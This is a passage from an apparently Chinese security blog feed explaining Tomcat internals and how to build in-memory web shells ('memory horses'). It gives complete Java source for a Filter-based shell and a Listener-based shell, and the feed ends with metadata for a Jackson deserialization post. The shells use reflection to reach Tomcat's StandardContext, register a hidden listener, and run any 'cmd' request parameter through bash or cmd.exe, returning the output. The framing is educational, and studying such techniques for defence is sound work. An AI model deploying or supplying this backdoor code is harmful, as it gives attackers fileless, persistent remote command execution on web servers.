clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.init(filterConfig);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">commmand</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(commmand);  </span><br><span class="line">            response.getWriter().println(output);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> <span class="string">&quot;Error executing command: \n&quot;</span> + e.getMessage();  </span><br><span class="line">            response.getWriter().println(errorMessage);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;  </span><br><span class="line">        Filter.<span class="built_in">super</span>.destroy();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250730121828.png" alt="image.png"></p><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="源码调试-1"><a href="#源码调试-1" class="headerlink" title="源码调试"></a>源码调试</h4><p>Litener又在Filter之前<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724011341.png" alt="image.png"><br>在<code>tomcat</code>中，常见的<code>Listener</code>有以下几种：</p><ul><li>&#x3D;&#x3D;<code>ServletContextListener</code>&#x3D;&#x3D;，用来监听整个<code>Web</code>应用程序的启动和关闭事件，需要实现<code>contextInitialized</code>和<code>contextDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>ServletRequestListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>请求的创建和销毁事件，需要实现<code>requestInitialized</code>和<code>requestDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionListener</code>&#x3D;&#x3D;，用来监听<code>HTTP</code>会话的创建和销毁事件，需要实现<code>sessionCreated</code>和<code>sessionDestroyed</code>这两个方法；</li><li>&#x3D;&#x3D;<code>HttpSessionAttributeListener</code>&#x3D;&#x3D;，监听<code>HTTP</code>会话属性的添加、删除和替换事件，需要实现<code>attributeAdded</code>、<code>attributeRemoved</code>和<code>attributeReplaced</code>这三个方法。</li></ul><p>很明显，<code>ServletRequestListener</code>是最适合做内存马的，因为它只要访问服务就能触发操作。<br>这个接口的位置在<code>javax.servlet.ServletRequestListener</code></p><p>实现一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.MemShell;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebListener(&quot;/test&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;[+] initial TestListener&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动并发起一个请求<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013002.png" alt="image.png"></p><p>在requestDestroyed和requestInitialized方法打断点<br>可以看见在&#x3D;&#x3D;进入context的pipLine之前&#x3D;&#x3D;, 是<code>context.fireRequestInitEvent(request.getRequest()))</code>来触发事件监听器的<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013313.png" alt="image.png"></p><p>跟进<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724013742.png" alt="image.png"><br><code>getApplicationEventListeners</code>获取的Listeners</p><p>对应方法定义如下<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250724014542.png" alt="image.png"></p><p>可以看见也存在添加Listener的方法</p><h4 id="Listener内存马构造"><a href="#Listener内存马构造" class="headerlink" title="Listener内存马构造"></a>Listener内存马构造</h4><p>有了之前的经验就比较简单了<br>用servlet写个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.Servlets;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContextFacade;  </span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;  </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@WebServlet(&quot;/test2&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testWithListenerServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;  </span><br><span class="line">        <span class="comment">// 获取standardContext  </span></span><br><span class="line">        <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) getRequestFacadeFromThreadLocal();  </span><br><span class="line">        <span class="type">ApplicationContextFacade</span> <span class="variable">applicationContextFacade</span> <span class="operator">=</span> (ApplicationContextFacade) requestFacade.getServletContext();  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">acf</span> <span class="operator">=</span> applicationContextFacade.getClass();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">appctxfield</span> <span class="operator">=</span> acf.getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            appctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">appctx</span> <span class="operator">=</span> (ApplicationContext) appctxfield.get(applicationContextFacade);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">stdctxfield</span> <span class="operator">=</span> appctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);  </span><br><span class="line">            stdctxfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">stdctx</span> <span class="operator">=</span> (StandardContext) stdctxfield.get(appctx);  </span><br><span class="line">            System.out.println(<span class="string">&quot;standardContext: &quot;</span> + stdctx.getClass().getName());  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">evilListener</span>();  </span><br><span class="line">            stdctx.addApplicationEventListener(listener);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        response.getWriter().println(<span class="string">&quot;Hello World!&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;[+] destroy TestListener&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> sre.getServletRequest().getParameter(<span class="string">&quot;cmd&quot;</span>);  </span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> executeCmd(cmd);  </span><br><span class="line">                <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Class&lt;?&gt; requestClazz = requestFacade.getClass();  </span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestfield</span> <span class="operator">=</span> requestClazz.getDeclaredField(<span class="string">&quot;request&quot;</span>);  </span><br><span class="line">                    requestfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestfield.get(requestFacade);  </span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();  </span><br><span class="line">                    response.getWriter().println(output);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">executeCmd</span><span class="params">(String multiLineCommand)</span> &#123;  </span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">os</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase();  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;cmd.exe&quot;</span> : <span class="string">&quot;/bin/bash&quot;</span>;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">shellOption</span> <span class="operator">=</span> os.contains(<span class="string">&quot;win&quot;</span>) ? <span class="string">&quot;/c&quot;</span> : <span class="string">&quot;-c&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(shell, shellOption, multiLineCommand);  </span><br><span class="line">            builder.redirectErrorStream(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> builder.start();  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(  </span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()))) &#123;  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;  </span><br><span class="line">                    output.append(line).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="type">int</span> <span class="variable">exitCode</span> <span class="operator">=</span> process.waitFor();  </span><br><span class="line">            output.append(<span class="string">&quot;Process exited with code: &quot;</span>).append(exitCode).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;  </span><br><span class="line">            output.append(<span class="string">&quot;Error: &quot;</span>).append(e.getMessage()).append(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> output.toString();  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ServletRequest <span class="title function_">getRequestFacadeFromThreadLocal</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="comment">// 设置WRAP_SAME_OBJECT为true  </span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">boolfield</span> <span class="operator">=</span> clazz1.getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);  </span><br><span class="line">            boolfield.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);  </span><br><span class="line">            modifiersField.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(boolfield, boolfield.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">            boolfield.set(<span class="literal">null</span>, <span class="literal">true</span>);  </span><br><span class="line">            <span class="type">Boolean</span> <span class="variable">newValue</span> <span class="operator">=</span> (Boolean) boolfield.get(<span class="literal">null</span>);  </span><br><span class="line">            System.out.println(<span class="string">&quot;WRAP_SAME_OBJECT: &quot;</span>);  </span><br><span class="line">            System.out.println(newValue);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);  </span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);  </span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">            modifiersField.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~Modifier.FINAL);  </span><br><span class="line">  </span><br><span class="line">            <span class="comment">// 设置lastServicedRequest和lastServicedResponse为ThreadLocal  </span></span><br><span class="line">            <span class="keyword">if</span>(lastServicedRequest.get(<span class="literal">null</span>) == <span class="literal">null</span> || lastServicedResponse.get(<span class="literal">null</span>) == <span class="literal">null</span>)&#123;  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedRequestValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; lastServicedResponseValue = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();  </span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>, lastServicedRequestValue);  </span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>, lastServicedResponseValue);  </span><br><span class="line">                <span class="keyword">return</span> lastServicedRequestValue.get();  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// 获取ThreadLocal中的ServletRequest  </span></span><br><span class="line">                ThreadLocal&lt;ServletRequest&gt; tl = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);  </span><br><span class="line">                <span class="keyword">return</span> tl.get();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09"># Tomcat 架构原理解析到架构设计借鉴</a></p><p><a href="https://xz.aliyun.com/news/18301">从零掌握java内存马大全（基于LearnJavaMemshellFromZero复现重组）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Tomcat-架构原理-Tomcat内存马&quot;&gt;&lt;a href=&quot;#Tomcat-架构原理-Tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;Tomcat 架构原理 &amp;amp; Tomcat内存马&quot;&gt;&lt;/a&gt;Tomcat 架构原理 &amp;amp;</summary>
      
    
    
    
    <category term="JavaSec" scheme="http://example.com/categories/JavaSec/"/>
    
    
    <category term="Tomcat内存马" scheme="http://example.com/tags/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>Jackson反序列化</title>
    <link href="http://example.com/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://example.com/2025/09/10/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2025-09-10T06:36:34.000Z</published>
    <updated>2025-09-10T07:40:11.892Z</updated>
    
